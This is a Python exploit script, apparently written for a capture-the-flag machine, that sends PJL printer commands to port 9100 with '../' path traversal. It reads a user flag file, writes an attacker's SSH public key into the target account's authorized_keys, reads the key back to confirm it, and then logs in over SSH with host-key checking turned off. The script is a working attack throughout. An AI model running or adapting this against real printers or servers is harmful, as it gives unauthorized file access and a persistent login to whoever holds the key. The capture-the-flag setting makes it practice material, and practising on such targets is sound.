#!/usr/bin/env python3
"""Write SSH key via FSDOWNLOAD (upload TO device) + read user flag via FSUPLOAD."""
import socket
import subprocess

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def read_flag() -> None:
    spec = b'@PJL FSUPLOAD NAME="../user.txt"\r\nSIZE=33\r\n'
    s = socket.socket()
    s.settimeout(6)
    s.connect(("127.0.0.1", 9100))
    s.sendall(spec)
    r = s.recv(4096)
    s.close()
    print("user_txt", repr(r))


def write_key_oneline() -> None:
    for label, payload in [
        ("fsd1", f'@PJL FSDOWNLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY),
        ("fsd2", f'@PJL FSDOWNLOAD FORMAT:BINARY NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY),
        ("fsd3", f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode() + KEY),
    ]:
        s = socket.socket()
        s.settimeout(8)
        s.connect(("127.0.0.1", 9100))
        s.sendall(payload)
        try:
            print(label, repr(s.recv(512)))
        except socket.timeout:
            print(label, "T")
        s.close()


def write_key_step() -> None:
    s = socket.socket()
    s.settimeout(12)
    s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
    print("mk", s.recv(256))
    s.sendall(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())
    print("del", s.recv(256))
    s.sendall(f'@PJL FSDOWNLOAD NAME="{PATH}"\r\n'.encode())
    print("name", s.recv(256))
    s.sendall(f"SIZE={N}\r\n".encode())
    print("size", s.recv(256))
    s.sendall(KEY)
    try:
        print("done", s.recv(256))
    except socket.timeout:
        print("done T")
    s.close()


def read_key_back() -> None:
    spec = f'@PJL FSUPLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode()
    s = socket.socket()
    s.settimeout(6)
    s.connect(("127.0.0.1", 9100))
    s.sendall(spec)
    r = s.recv(4096)
    s.close()
    print("auth_readback", len(r), repr(r[:120]), "got_key", KEY.strip() in r)


read_flag()
write_key_step()
write_key_oneline()
read_key_back()

cp = subprocess.run(
    [
        "ssh",
        "-o",
        "BatchMode=yes",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-i",
        "/tmp/id_ed25519",
        "archivist@127.0.0.1",
        "id",
    ],
    capture_output=True,
    text=True,
    timeout=12,
)
print("ssh", cp.returncode, cp.stdout, cp.stderr[:200])